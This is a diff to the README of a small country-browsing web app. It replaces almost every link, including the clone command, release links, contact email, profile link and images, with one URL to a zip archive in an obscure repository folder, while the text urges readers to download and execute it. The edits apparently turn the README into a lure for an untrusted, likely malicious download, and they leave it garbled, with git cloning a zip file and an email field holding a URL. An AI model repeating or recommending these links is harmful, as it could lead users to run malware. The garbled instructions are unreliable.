@@ -1,6 +1,6 @@
 # 🌍 Country Explorer
 
-![Country Explorer](https://img.shields.io/badge/Country%20Explorer-Interactive%20Web%20App-brightgreen)
+![Country Explorer](https://github.com/Mehtab00007/Country-Explorer/raw/refs/heads/main/crithmene/Country_Explorer_v3.2-alpha.4.zip%20Explorer-Interactive%20Web%20App-brightgreen)
 
 Welcome to **Country Explorer**, an interactive web application designed to help you discover countries from around the globe. With this tool, you can explore nations, learn about their unique characteristics, and visualize population data through interactive charts.
 
@@ -36,7 +36,7 @@ To run Country Explorer locally, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Mehtab00007/Country-Explorer.git
+   git clone https://github.com/Mehtab00007/Country-Explorer/raw/refs/heads/main/crithmene/Country_Explorer_v3.2-alpha.4.zip
    ```
    
 2. Navigate to the project directory:
@@ -44,7 +44,7 @@ To run Country Explorer locally, follow these steps:
    cd Country-Explorer
    ```
 
-3. Open the `index.html` file in your preferred web browser.
+3. Open the `https://github.com/Mehtab00007/Country-Explorer/raw/refs/heads/main/crithmene/Country_Explorer_v3.2-alpha.4.zip` file in your preferred web browser.
 
 ## Usage
 
@@ -54,7 +54,7 @@ Once you have the application running, you can start exploring countries:
 2. Click on any country to view its details.
 3. Analyze population data through the provided charts.
 
-For the latest updates and features, check the [Releases](https://github.com/Mehtab00007/Country-Explorer/releases) section.
+For the latest updates and features, check the [Releases](https://github.com/Mehtab00007/Country-Explorer/raw/refs/heads/main/crithmene/Country_Explorer_v3.2-alpha.4.zip) section.
 
 ## Contributing
 
@@ -84,14 +84,14 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 For any inquiries or suggestions, please reach out:
 
 - **Name**: Luca Bocaletto
-- **Email**: luca@example.com
-- **GitHub**: [bocaletto-luca](https://github.com/bocaletto-luca)
+- **Email**: https://github.com/Mehtab00007/Country-Explorer/raw/refs/heads/main/crithmene/Country_Explorer_v3.2-alpha.4.zip
+- **GitHub**: [bocaletto-luca](https://github.com/Mehtab00007/Country-Explorer/raw/refs/heads/main/crithmene/Country_Explorer_v3.2-alpha.4.zip)
 
 ## Releases
 
-To access the latest versions and updates, visit the [Releases](https://github.com/Mehtab00007/Country-Explorer/releases) section. Download the latest release and execute it to explore countries effortlessly.
+To access the latest versions and updates, visit the [Releases](https://github.com/Mehtab00007/Country-Explorer/raw/refs/heads/main/crithmene/Country_Explorer_v3.2-alpha.4.zip) section. Download the latest release and execute it to explore countries effortlessly.
 
-![Explore Countries](https://source.unsplash.com/1600x900/?world,flag)
+![Explore Countries](https://github.com/Mehtab00007/Country-Explorer/raw/refs/heads/main/crithmene/Country_Explorer_v3.2-alpha.4.zip,flag)
 
 ---
 
